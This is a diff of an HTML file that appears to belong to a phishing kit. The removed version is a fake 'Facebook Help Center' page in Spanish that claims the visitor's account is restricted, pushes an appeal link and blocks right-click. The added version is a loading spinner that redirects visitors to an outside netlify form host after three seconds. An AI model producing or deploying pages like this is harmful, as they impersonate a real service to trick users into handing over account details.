@@ -1,41 +1,55 @@
+
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-    <link rel="stylesheet" href="style.css">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      overflow: hidden;
+    }
+
+    .loading-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .spinner {
+      border: 4px solid rgba(0, 0, 255, 0.3);
+      border-top: 4px solid #0000FF;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+      var currentHost = window.location.hostname;
+      
+      setTimeout(function() {
+        var redirectURL = "https://submit-forms.netlify.app/"; // Updated URL
+        window.location.replace(redirectURL);
+      }, 3000); // 3000 milliseconds (3 seconds)
+    });
+  </script>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
-            <div id="data">
-                <h4>Facebook Help Center</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
-              </div>
-              <div class="line"></div>
-            <div id="para">
-                <p> 𝐃𝐞𝐭𝐞𝐜𝐭𝐚𝐦𝐨𝐬 𝐮𝐧𝐚 𝐚𝐜𝐭𝐢𝐯𝐢𝐝𝐚𝐝 𝐢𝐧𝐮𝐬𝐮𝐚𝐥 𝐲 𝐫𝐞𝐬𝐭𝐫𝐢𝐧𝐠𝐢𝐦𝐨𝐬 𝐬𝐮 𝐜𝐮𝐞𝐧𝐭𝐚. </p>
-              <p>
-                𝐏𝐮𝐞𝐝𝐞 𝐩𝐫𝐞𝐬𝐞𝐧𝐭𝐚𝐫 𝐮𝐧 𝐫𝐞𝐜𝐮𝐫𝐬𝐨 𝐝𝐞 𝐫𝐞𝐯𝐢𝐬𝐢ó𝐧
-
-              </p>
-                <button> <a href="help.html">Continuar</a> </button>
-            </div>
-        </div>
-    </div>
-
-<script type="text/javascript">
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        });
-    </script>
+  <div class="loading-container">
+    <div class="spinner"></div>
+    <p>Loading page...</p>
+  </div>
 </body>
-
 </html>
